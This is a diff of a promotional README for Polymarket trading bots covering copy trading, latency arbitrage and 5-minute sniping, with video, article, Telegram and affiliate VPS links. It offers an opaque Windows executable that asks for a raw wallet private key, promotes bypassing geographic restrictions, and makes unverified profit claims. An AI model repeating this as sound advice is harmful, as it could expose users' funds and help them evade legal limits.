@@ -1,91 +1,123 @@
-# 🚀 Polymarket Trading Bots Telegram Service
+# 🚀 Polymarket Trading Bot Telegram Services (Updated 2026)
 
-## 📹 YouTube Tutorials: Unlock Your Setup & Trading Power with the UI
+Imagine a future where AI-driven bots outpace human traders, exploiting microsecond edges in prediction markets to turn data into dollars. Our open-source Rust-based tools, fused with seamless Telegram integration, empower you to dive into this visionary realm of Polymarket trading.  
+Focus: copy trading, latency arbitrage, 5-min cycle sniping, market making, simulation, and low-latency execution under current rules (post-Feb 2026 updates).
 
-### Copy Trading Bot Series
-- ⚙️ Learn how to run and use the current codebase: [Setup & Usage Guide](https://www.youtube.com/watch?v=QLA1NJL32xs)
-- 📹 Watch the Telegram UI walkthrough: [Tutorial Video](https://www.youtube.com/watch?v=gm8J2mmerBQ)
-- 🧪 See the CLI test in action: [Simple Test / CLI Bot](https://www.youtube.com/watch?v=6ZRIIPzv3d8)
+<img width="1312" height="736" alt="image" src="https://github.com/user-attachments/assets/610ca14e-8a6a-4948-a9ad-642a70ea9391" />
 
-### Cycle End Sniper - Trading Bot Series
-- ⚡ **[NEW]** [Cycle End Sniper |_Polymarket 5min Crypto Market_Trading Bot](https://www.youtube.com/watch?v=CipdY9aCCwE)  
+## 📹 Core YouTube Showcases – Current Work Highlights
 
-  *(Detects lightning-fast Crypto moves on Binance/Bybit and enters Polymarket 5-minute "Up or Down" positions BEFORE the market price adjusts → pure latency edge)*
----
-## 📱 Telegram Bot: Explore the Trading Simulator & Test in Action
+Step into the cutting-edge with these demos that showcase how our bots harness AI and speed to redefine trading.
 
-- 🛡️ **Cycle End Sniper | Polymarket 5min Trading Bot**: [Cycle End Sniper](https://t.me/poly5mbot)  
-- 🎯 Explore the Trading Simulator: [Simulator Bot](https://t.me/poly_copy_tg_bot)  
-- 🚀 Test the Trading Bot in Action: [Test Bot](https://t.me/poly_copy_prod_tg_bot)  
+- ⚡ **Latency Arbitrage Bot (Rust, quick-build example)**: Reverse-engineered from real $50 → $435k BTC lag exploit case. Local execution, 0.3–0.8% targets, strict risk rules (0.5% per trade / 2% daily). Code + setup walkthrough.  
+  [Watch Video](https://www.youtube.com/watch?v=jL8cuzkclHg)
 
-  *(Note: Use this bot to experiment with the risk-free trading strategy in a simulated environment)*
----
+<img width="2400" height="1260" alt="image" src="https://github.com/user-attachments/assets/67319cc3-c14c-43d2-9b33-1935a5c94ce3" />
 
-## 📞 Contact & Support
+- ⚡ **5-Min Bitcoin "Up or Down" Latency Sniper / Cycle End Sniper**: Detects rapid moves on Binance/Bybit → enters Polymarket 5-min positions before odds update. Covers hedging, mispricing, oracle risks, high-volume examples.  
+  [Watch Video](https://www.youtube.com/watch?v=CipdY9aCCwE)
 
-- 📱 Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
-- 🐦 X: [@soulcrancerdev](https://x.com/soulcrancerdev)
+- ⚙️ **Copy Trading Bot – Setup & Rust Codebase**: Full guide to env vars, strategies (PERCENTAGE/FIXED/ADAPTIVE), preview mode, running the bot, Rust advantages (speed, reliability).  
+  [Watch Video](https://www.youtube.com/watch?v=QLA1NJL32xs)
 
----
+## 📚 Reference Articles (dev.to) – In-Depth Guides & Strategy Breakdowns
 
-## 🚀 Let's Trade!!
+These written tutorials provide detailed explanations, rule updates, code concepts, and strategy deep-dives that pair perfectly with the videos above.
 
-### **🤖 Polymarket Copy Trading Rust Bot - for Windows**
-- 🗂️ [polymarket-copy-trading-bot-x86_64.zip](https://github.com/user-attachments/files/25414423/polymarket-copy-trading-bot-x86_64.zip)
+- **How to build a Polymarket trading bot (after new rules edition)**  
+  Posted Feb 26, 2026
+  Covers major 2026 rule changes (removal of 500ms taker delay, dynamic taker fees up to ~1.56%), why taker bots are now unviable, shift to maker strategies (zero fees + rebates), WebSocket usage, fee-aware signing (`feeRateBps`), fast cancel/replace loops, and a specific maker approach for 5-min BTC markets (post T-10s directional bets). Warns against outdated arbitrage tactics and stresses low-latency + backtesting.  
+  [Read Article](https://dev.to/soulcrancerdev/how-to-build-a-polymarket-trading-bot-after-new-rules-edition-5h09)
 
-1. 📂 Extract `polymarket-copy-trading-bot-x86_64.zip` file.
-2. ⚙️ Environment Variables Settings
-   ```
-   - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
-   - PROXY_WALLET=0xYourWalletAddress               # Your wallet (must match PRIVATE_KEY)
-   - PRIVATE_KEY=your_64_char_hex_private_key       # Private key without 0x prefix
-   - RPC_URL=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID        # Polygon RPC endpoint (you can use Infura, Alchemy, or QuickNode)
-   - MONGO_URI='mongodb+srv://user:pass@cluster.mongodb.net/database'    # ⚠️  Keep this private! Never share or commit to git
-   - COPY_STRATEGY=PERCENTAGE                       # Copy strategy: PERCENTAGE, FIXED, or ADAPTIVE
-   - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
-   - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
-   - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
-   - PREVIEW_MODE=true                              # true: Monitor trades but DO NOT execute them (safe testing), false: live trading
-   ```
-3. ▶️ Run `polymarket-copy-trading-bot-x86_64.exe`
+- **Turning $50 into $435,000 on Polymarket: Reverse-Engineering a Latency Arbitrage Bot in Rust**  
+  Posted Mar 4, 2026  
+  Reverse-engineers a real-world latency arbitrage case ($50 → $435k growth) by exploiting BTC price lags between real-time feeds (TradingView, CryptoQuant) and Polymarket contracts. Details Rust implementation (WebSockets, lag detection >0.3%, <100ms execution), risk rules (0.5% per trade / 2% daily cap), and AI-assisted build process (Claude in 40 minutes). Discusses diminishing edges, gas/slippage risks, and compliance notes.  
+  [Read Article](https://dev.to/soulcrancerdev/turning-50-into-435000-on-polymarket-reverse-engineering-a-latency-arbitrage-bot-in-rust-2ak7)
 
----
-<p float="left">
+- **Beating Polymarket's 5-Minute Crypto Up/Down Markets: Latency Polymarket Arbitrage Trading Bot Explained**  
+  Posted Feb 26, 2026  
+  Explains latency arbitrage on high-volume 5-min BTC Up/Down markets (> $25M traded early). Bot uses faster exchange data (Binance/Bybit) to detect moves before Polymarket odds adjust, enter positions, and hedge Yes/No for quick exits. Covers examples of mispricings, hedging mechanics, risks (volatility, fees, oracle delays), and HFT-inspired execution. Not risk-free; emphasizes speed.  
+  [Read Article](https://dev.to/soulcrancerdev/beating-polymarkets-5-minute-crypto-updown-markets-latency-polymarket-arbitrage-trading-bot-2naj)
+
+## 📱 Telegram Bots – Live, Simulated & Control Interfaces
+
+Control the future of trading right from your chat—seamless, powerful, and visionary.
+
+- 🛡️ **Cycle End Sniper | Polymarket 5-Min Trading Bot**: Latency sniping + paper/real modes, auto buys on thresholds, risk exits, wallet/deposit/withdraw/redeem, live logs & strategy config.  
+  [Access Bot](https://t.me/poly5mbot)
+
+- 🎯 **Trading Simulator**: Risk-free testing of strategies.  
+  [Access Bot](https://t.me/poly_copy_tg_bot)
+
+- 🚀 **Production/Test Bot**: Live-like execution with simulation/preview modes.  
+  [Access Bot](https://t.me/poly_copy_prod_tg_bot)
+
+**Telegram Control Features** (for copy trading & others):  
+- Manage config & environment variables directly  
+- Real-time health checks  
+- Monitor balances & PnL  
+- Start/stop bot instantly  
+- Live log streaming  
+- No terminal/SSH required
+
+### Screenshots & Demo
+- **Telegram UI**:  
+  <p float="left">
    <img width="260" height="1026" alt="image" src="https://github.com/user-attachments/assets/b15b436a-a7f2-4a47-b970-aa113f294e74" />
    <img width="260" height="1026" alt="telegram bot-1" src="https://github.com/user-attachments/assets/cbe68dc3-939a-4856-8a82-8e59d5588b1c" />
    <img width="260" height="1026" alt="telegram bot-2" src="https://github.com/user-attachments/assets/3810d21f-8eaa-4503-80ab-eaa54604cc46" />
 </p>
 
-https://github.com/user-attachments/assets/2e462566-f4cc-45c3-a3b1-6aa7757b0f32
+- **Video Demo**:  
 
----
-## ✨ Features
-- 👥 **Multi-trader support** — Follow several traders at once; your edge is mirroring many minds instead of one.
-- 📏 **Dynamic sizing** — Order size scales with your capital and strategy (percentage, fixed, or adaptive).
-- 🔝 **Tiered multipliers** — Bigger trades can use different scaling than small ones.
-- 📊 **Accurate bookkeeping** — Tracks every buy and sell so positions stay correct even when balances change.
-- 📦 **Batched orders** — Groups small signals into fewer, larger orders when aggregation is enabled.
-- ⚡ **Live execution** — Sub-second monitoring and immediate placement on the CLOB.
-- 💾 **MongoDB-backed state** — All activity and positions stored for replay and analysis.
-- 🛡️ **Slippage guards** — Avoids fills at worse-than-acceptable prices.
+  https://github.com/user-attachments/assets/2e462566-f4cc-45c3-a3b1-6aa7757b0f32
 
----
-## 🚀 VPS Recommendation – Low-Latency Execution & GEO restrictions support
+## ✨ Comprehensive Key Features (All Bots & Tools)
 
-**Latency = edge** in Polymarket.
+Unlock the power of tomorrow's trading tech today—these features propel you into a world of automated alpha and edge-hunting precision.
 
-**[Trading VPS →](https://app.tradingvps.io/aff.php?aff=60)** is the go-to low-latency hosting solution among serious prediction-market and crypto bot runners.
+<img width="931" height="551" alt="image" src="https://github.com/user-attachments/assets/1f8d5ccf-1b6b-419b-ac5a-56e2cf1929d9" />
 
-- ⏱️ Sub-1 ms to major Polygon nodes  
-- 🔒 Crypto/HFT-optimized locations  
-- 📈 Exceptional uptime & network performance  
+- 👥 **Multi-trader support** — Copy/follow several successful traders at once for diversified alpha  
+- 📏 **Dynamic order sizing** — PERCENTAGE (e.g. 10% of trader's size), FIXED (set USD amount), ADAPTIVE (capital-based scaling)  
+- 🔝 **Tiered multipliers** — Apply different scaling rules for large vs. small copied trades  
+- 📊 **Accurate position bookkeeping** — Tracks every buy/sell to keep net positions correct even with partial fills or balance changes  
+- 📦 **Order batching & aggregation** — Groups small signals into fewer, gas-efficient larger orders  
+- ⚡ **Sub-second / low-latency monitoring & execution** — Real-time CLOB order placement on Polymarket  
+- 🛡️ **Slippage guards & protection** — Rejects fills worse than acceptable price thresholds  
+- 💰 **PnL tracking & monitoring** — Real-time profit/loss calculation (added Feb 2026)  
+- 🏥 **Health checks & live status** — Via Telegram (balances, logs, bot state)  
+- 🔄 **Start/stop & config management** — Full control from Telegram without local terminal  
+- 💾 **MongoDB-backed persistent state** — Stores trades, positions, history for replay, analysis, and recovery  
+- 🔍 **Latency arbitrage detection** — Exploits price lags (e.g., exchange vs. Polymarket odds) — dedicated bot + examples  
+- ⚡ **Cycle-end / 5-min sniping** — Fast crypto move detection → pre-adjustment entry on "Up or Down" markets  
+- 📈 **Market making support** — Inventory management, quote placement, cancel/replace, risk controls (separate bot module)  
+- 🧪 **Preview / simulation mode** — `PREVIEW_MODE=true` monitors signals without executing trades (safe testing)  
+- 🔐 **Risk controls** — Max/min order sizes (`MAX_ORDER_SIZE_USD`, `MIN_ORDER_SIZE_USD`), per-trade/daily caps in arbitrage examples  
+- 🌐 **Multi-market / hedging awareness** — Yes/No hedging, redemption handling, cross-market compatibility notes  
+- 📡 **Telegram UI & integration** — Config, monitoring, logs, wallet ops, strategy tweaks  
+- ⏱️ **Optimized for low-latency VPS** — Sub-1 ms to Polygon nodes, GEO restriction bypass (AMS recommended)
 
-Note: Polymarket has some GEO restrictions, so many Polymarket traders are using our AMS VPS and love it.
+## 🚀 Download & Quick Setup: Copy Trading Rust Bot (Windows)
 
----
+- **Executable**: [polymarket-copy-trading-bot-x86_64.zip](https://github.com/user-attachments/files/25414423/polymarket-copy-trading-bot-x86_64.zip)  
+- Extract → Set env vars (see original list: `USER_ADDRESSES`, `PRIVATE_KEY`, `RPC_URL`, `MONGO_URI`, `COPY_STRATEGY`, etc.) → Run `.exe`  
+- Use `PREVIEW_MODE=true` for dry-run testing
 
-## 🤝 Support & Community
+## 🚀 VPS Recommendation (Essential for Latency Edge)
 
-⭐ Fork, star, and contribute to the project on GitHub.
+- **Trading VPS** → https://app.tradingvps.io/aff.php?aff=60  
+  Sub-1 ms to Polygon, crypto/HFT locations, high uptime, helps with GEO restrictions (AMS popular)
 
-📢 For the updates of the current copy trader w/ your tradin' logic, Reach out via Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
+## 📞 Contact & Community
+
+- 📱 Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev) — support, custom logic, updates  
+- 🐦 X: [@soulcrancerdev](https://x.com/soulcrancerdev)  
+
+⭐ Star/fork the repo. Contributions welcome — especially for post-2026 Polymarket rule adaptations, new strategies, or market maker enhancements.
+
+Envision the edge you're building—where bots don't just trade, they anticipate the future!
+
+<img width="1400" height="785" alt="image" src="https://github.com/user-attachments/assets/3059b5c6-62e5-48d2-96f6-0c9953c4bb2a" />
+
+Let's keep building the edge! 🚀
